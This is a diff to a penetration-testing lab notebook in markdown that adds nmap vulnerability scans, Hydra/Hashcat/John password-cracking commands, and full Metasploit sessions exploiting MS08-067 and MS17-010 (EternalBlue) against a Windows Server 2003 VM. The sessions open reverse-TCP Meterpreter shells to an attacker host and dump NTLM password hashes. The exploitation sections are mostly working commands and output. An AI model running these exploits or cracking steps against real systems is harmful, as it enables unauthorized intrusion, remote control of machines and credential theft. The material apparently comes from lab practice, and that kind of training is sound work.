@@ -4,7 +4,7 @@
 ```
 # scanning for open ports
 nmap -p- -O -sV 192.168.37.1/24
-
+-----------------------------------------------------------------------------------
 ## nmap-vulscan
 
 # installation
@@ -14,13 +14,16 @@ ln -s `pwd`/scipag_vulscan /usr/share/nmap/scripts/vulscan
 cd vulscan/utilities/updater/
 chmod +x updateFiles.sh
 ./updateFiles.sh
-
+-----------------------------------------------------------------------------------
+# scanning vuln
+nmap -sV --script vuln 192.168.37.104
+-----------------------------------------------------------------------------------
 # scanning cve
 nmap --script vulscan/ --script-args vulscandb=cve.csv -sV -oN 101.txt $IP
-
+-----------------------------------------------------------------------------------
 # enumerate users
 nmap -script smb-enum-users.nse -p 445 192.168.37.101
-
+-----------------------------------------------------------------------------------
 # enumerate auth methods supported
 nmap --script ssh-auth-methods $IP
 ```
@@ -129,13 +132,19 @@ msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
 ## Cracking password
 how to HACK a password // password cracking with Kali Linux and HashCat
 `https://www.youtube.com/watch?v=z4_oqTZJqCo`
+
+Retrieving passwords using NTLM + cracked LM hashes `https://github.com/ricardojoserf/LM_original_password_cracker`
 ```
 # using hydra for bruteforce-attack
 hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 41221
 # using hashcat 
 sudo hashcat -a 0 -m 500 hashes.txt /usr/share/wordlists/rockyou.txt 
 # using john the ripper
+# for meta
 john --format=md5crypt hashes.txt
+# for windows server
+john --format=LM 104.txt 
+
 ```
 
 ## Windows XP
@@ -167,7 +176,7 @@ MAC Address: 00:0C:29:52:71:FE (VMware)
 Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
 ```
 ## Windows Server 2003
-* Link download `https://archive.org/details/WinServer2003EnterpriseEditionSP1RUS`
+* Link download `https://archive.org/details/WindowsServer2003StandardEditionwithServicePack2x86Russian`
 
 ### Opening ports
 ```
@@ -177,16 +186,159 @@ PORT     STATE    SERVICE         VERSION
 135/tcp  open     msrpc           Microsoft Windows RPC
 139/tcp  open     netbios-ssn     Microsoft Windows netbios-ssn
 389/tcp  open     ldap            Microsoft Windows Active Directory LDAP (Domain: lab6.local, Site: Default-First-Site)
-444/tcp  filtered snpp
 445/tcp  open     microsoft-ds    Microsoft Windows 2003 or 2008 microsoft-ds
-515/tcp  filtered printer
-587/tcp  filtered submission
 1025/tcp open     msrpc           Microsoft Windows RPC
 1027/tcp open     ncacn_http      Microsoft Windows RPC over HTTP 1.0
-1029/tcp filtered ms-lsa
-3000/tcp filtered ppp
-8000/tcp filtered http-alt
-8081/tcp filtered blackice-icecap
-MAC Address: 00:0C:29:9B:5E:FC (VMware)
+
 Service Info: Host: DC-WIN2003; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
 ```
+### Check if smb-vulner
+```
+nmap --script smb-vuln* -p 137,139,445 192.168.37.104
+Host script results:
+|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|_smb-vuln-ms10-054: false
+```
+
+### Check smb version
+```
+msf6 > use scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.37.104
+RHOSTS => 192.168.37.104
+msf6 auxiliary(scanner/smb/smb_version) > run
+
+[*] 192.168.37.104:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
+[+] 192.168.37.104:445    -   Host is running Windows 2003 SP2 (build:3790) (name:ABC-F4E78EACEE7) (workgroup:WORKGROUP)
+```
+
+### ms08-067 module
+```
+msf6 > use exploit/windows/smb/ms08_067_netapi
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 192.168.37.104
+RHOSTS => 192.168.37.104
+msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.37.103
+LHOST => 192.168.37.103
+msf6 exploit(windows/smb/ms08_067_netapi) > set TARGET 79
+TARGET => 79
+msf6 exploit(windows/smb/ms08_067_netapi) > exploit
+meterpreter > hashdump
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:a678c3c5bab6c7cd2d8f07a65f774322:::
+�������������:500:f327719aa33209c30127e6c633058252:d163811087541b61267b389d0a94fed2:::
+�����:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+### ms17-010 module
+Exploit EternalBlue on Windows Server with Metasploit `https://null-byte.wonderhowto.com/how-to/exploit-eternalblue-windows-server-with-metasploit-0195413/`
+
+```
+# ms17_010_psexec
+msf6 > use exploit/windows/smb/ms17_010_psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_psexec) > show options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                                Required  Description
+   ----                  ---------------                                --------  -----------
+   DBGTRACE              false                                          yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                             yes       How many times to try to leak transaction
+   NAMEDPIPE                                                            no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlist  yes       List of named pipes to check
+                         s/named_pipes.txt
+   RHOSTS                                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M
+                                                                                  etasploit
+   RPORT                 445                                            yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                                  no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                 no        The service display name
+   SERVICE_NAME                                                         no        The service name
+   SHARE                 ADMIN$                                         yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/wri
+                                                                                  te folder share
+   SMBDomain             .                                              no        The Windows domain to use for authentication
+   SMBPass                                                              no        The password for the specified username
+   SMBUser                                                              no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_psexec) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Automatic
+   1   PowerShell
+   2   Native upload
+   3   MOF upload
+
+
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.37.104
+RHOSTS => 192.168.37.104
+msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 192.168.37.103
+LHOST => 192.168.37.103
+msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 4321
+LPORT => 4321
+msf6 exploit(windows/smb/ms17_010_psexec) > run
+
+[*] Started reverse TCP handler on 192.168.37.103:4321 
+[*] 192.168.37.104:445 - Target OS: Windows Server 2003 3790 Service Pack 2
+[*] 192.168.37.104:445 - Filling barrel with fish... done
+[*] 192.168.37.104:445 - <---------------- | Entering Danger Zone | ---------------->
+[*] 192.168.37.104:445 -        [*] Preparing dynamite...
+[*] 192.168.37.104:445 -                Trying stick 1 (x64)...Miss
+[*] 192.168.37.104:445 -                [*] Trying stick 2 (x86)...Boom!
+[*] 192.168.37.104:445 -        [+] Successfully Leaked Transaction!
+[*] 192.168.37.104:445 -        [+] Successfully caught Fish-in-a-barrel
+[*] 192.168.37.104:445 - <---------------- | Leaving Danger Zone | ---------------->
+[*] 192.168.37.104:445 - Reading from CONNECTION struct at: 0x8783e308
+[*] 192.168.37.104:445 - Built a write-what-where primitive...
+[+] 192.168.37.104:445 - Overwrite complete... SYSTEM session obtained!
+[*] 192.168.37.104:445 - Selecting native target
+[*] 192.168.37.104:445 - Uploading payload... ydmYWLsA.exe
+[*] 192.168.37.104:445 - Created \ydmYWLsA.exe...
+[+] 192.168.37.104:445 - Service started successfully...
+[*] 192.168.37.104:445 - Deleting \ydmYWLsA.exe...
+[*] Sending stage (175686 bytes) to 192.168.37.104
+[*] Meterpreter session 3 opened (192.168.37.103:4321 -> 192.168.37.104:1033) at 2022-11-28 12:36:30 +0300
+
+meterpreter > 
+-----------------------------------------------------------------------------------
+# ms17_010_eternalblue
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.37.104
+RHOSTS => 192.168.37.104                                                          
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp                                    
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.37.103         
+LHOST => 192.168.37.103                                                           
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4321                   
+LPORT => 4321                                                                     
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+Exploit aborted due to failure: no-target: This module only supports x64 (64-bit) targets
+```
+
+
